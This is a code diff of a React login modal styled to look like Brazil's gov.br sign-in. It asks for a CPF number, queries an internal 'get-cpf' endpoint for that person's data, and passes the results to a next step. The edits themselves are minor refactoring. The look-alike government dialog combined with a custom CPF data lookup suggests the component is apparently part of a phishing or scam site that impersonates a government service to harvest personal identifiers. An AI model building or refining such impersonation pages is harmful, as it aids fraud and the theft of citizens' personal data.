@@ -10,6 +10,7 @@ export default function GovLoginModal({ open, onClose, onContinue }) {
   const dialogRef = useRef(null);
 
   useEffect(() => {
+
     if (!open) return;
 
     const prevOverflow = document.body.style.overflow;
@@ -18,15 +19,20 @@ export default function GovLoginModal({ open, onClose, onContinue }) {
     return () => {
       document.body.style.overflow = prevOverflow;
     };
+
   }, [open]);
 
   if (!open) return null;
 
   const onOverlayClick = (e) => {
-    if (e.target === e.currentTarget) onClose?.();
+    if (e.target === e.currentTarget) {
+      setCpf("");
+      onClose?.();
+    }
   };
 
   const onCpfChange = (e) => {
+
     const v = String(e.target.value || "")
       .replace(/\D/g, "")
       .slice(0, 11);
@@ -35,9 +41,8 @@ export default function GovLoginModal({ open, onClose, onContinue }) {
   };
 
 
-
   /*
-   CONSULTA API CPF
+    CONSULTA API VERCEL
   */
 
   const handleContinue = async (e) => {
@@ -53,10 +58,9 @@ export default function GovLoginModal({ open, onClose, onContinue }) {
 
     try {
 
-      const res = await fetch(`/api-cpf/get-cpf.php?cpf=${cpf}`);
+      const res = await fetch(`/api/get-cpf?cpf=${cpf}`);
 
       const data = await res.json();
-
 
       if (data.error) {
         alert(data.error);
@@ -64,16 +68,15 @@ export default function GovLoginModal({ open, onClose, onContinue }) {
         return;
       }
 
+      // Fecha modal antes de navegar
+      setCpf("");
+      onClose?.();
 
-      /*
-        ENVIA PARA PROXIMA PAGINA
-      */
-
+      // Envia dados para próxima etapa
       onContinue?.({
-        cpf: cpf,
+        cpf,
         dados: data
       });
-
 
     } catch (err) {
 
@@ -86,9 +89,12 @@ export default function GovLoginModal({ open, onClose, onContinue }) {
   };
 
 
-
   return (
-    <div className="gov-modal-overlay" onMouseDown={onOverlayClick}>
+
+    <div
+      className="gov-modal-overlay"
+      onMouseDown={onOverlayClick}
+    >
 
       <div
         className="gov-modal"
@@ -100,26 +106,27 @@ export default function GovLoginModal({ open, onClose, onContinue }) {
 
         <button
           className="gov-modal-close"
-          onClick={onClose}
+          onClick={() => {
+            setCpf("");
+            onClose?.();
+          }}
         >
           <X size={18} />
         </button>
-
 
 
         <div className="gov-modal-header">
           <img
             className="gov-modal-logo"
             src="/logo2.png"
+            alt="Logo"
           />
         </div>
-
 
 
         <div className="gov-modal-title">
           Identifique-se no gov.br com:
         </div>
-
 
 
         <div className="gov-modal-option">
@@ -143,7 +150,6 @@ export default function GovLoginModal({ open, onClose, onContinue }) {
         </div>
 
 
-
         <form
           className="gov-modal-form"
           onSubmit={handleContinue}
@@ -158,17 +164,15 @@ export default function GovLoginModal({ open, onClose, onContinue }) {
             placeholder="Digite seu CPF"
             value={cpf}
             onChange={onCpfChange}
+            inputMode="numeric"
+            autoComplete="off"
           />
-
-
 
           <button
             className="gov-modal-continue"
             disabled={loading}
           >
-
             {loading ? "Consultando..." : "Continuar"}
-
           </button>
 
         </form>
@@ -176,6 +180,6 @@ export default function GovLoginModal({ open, onClose, onContinue }) {
       </div>
 
     </div>
-  );
 
+  );
 }
